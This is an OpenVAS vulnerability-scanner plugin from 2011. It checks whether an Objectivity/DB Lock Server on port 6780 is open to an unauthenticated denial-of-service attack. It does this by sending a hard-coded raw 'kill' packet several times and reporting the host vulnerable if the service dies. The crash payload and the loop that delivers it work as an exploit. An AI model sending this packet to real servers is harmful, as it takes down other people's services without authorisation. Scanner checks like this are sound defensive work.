###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_objectivity_db_lock_srv_dos_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Objectivity/DB Lock Server Denial of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation may allow remote attackers to cause the application
  to crash by sending specific commands.
  Impact Level: Application";
tag_affected = "Objectivity/DB Version R10";
tag_insight = "The flaw is due to Lock Server component allowing to perform various
  administrative operations without authentication.";
tag_solution = "No solution or patch is available as of 28th January, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to https://download.objectivity.com/approved.aspx";
tag_summary = "This host is running Objectivity/DB Lock Server and is prone to denial
  of service vulnerability.";

if(description)
{
  script_id(900270);
  script_version("$Revision: 13 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-02-05 04:12:38 +0100 (Sat, 05 Feb 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Objectivity/DB Lock Server Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/42901");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/45803");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/64699");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15988/");

  script_description(desc);
  script_summary("Check Objectivity/DB Lock Server is vulnerable to DoS");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(6780);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

## Lock Server Server port
oolsPort = 6780;
if(!get_port_state(oolsPort)){
  exit(0);
}

## Crafted packet for Lock Server Server
ools_kill_data = raw_string(0x0d, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x77,
                            0x00, 0x00, 0x00, 0x04, 0xad, 0xc4, 0xae, 0xda,
                            0x9e, 0x48, 0xd6, 0x44, 0x03, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                            0x00, 0x00, 0x00, 0x00);

## Send Crafted packet several times
for(i=0; i < 5; i++)
{
  ## Open TCP Socket
  soc = open_sock_tcp(oolsPort);
  if(!soc){
    exit(0);
  }

  ## Send Crafted packet
  send(socket:soc, data:ools_kill_data);

  ## Close the scocket and wait for 5 seconds
  close(soc);
  sleep(5);

  ## Check, Still Lock Server service is running
  soc = open_sock_tcp(oolsPort);
  if(!soc)
  {
    security_hole(oolsPort);
    exit(0);
  }
  close(soc);
}
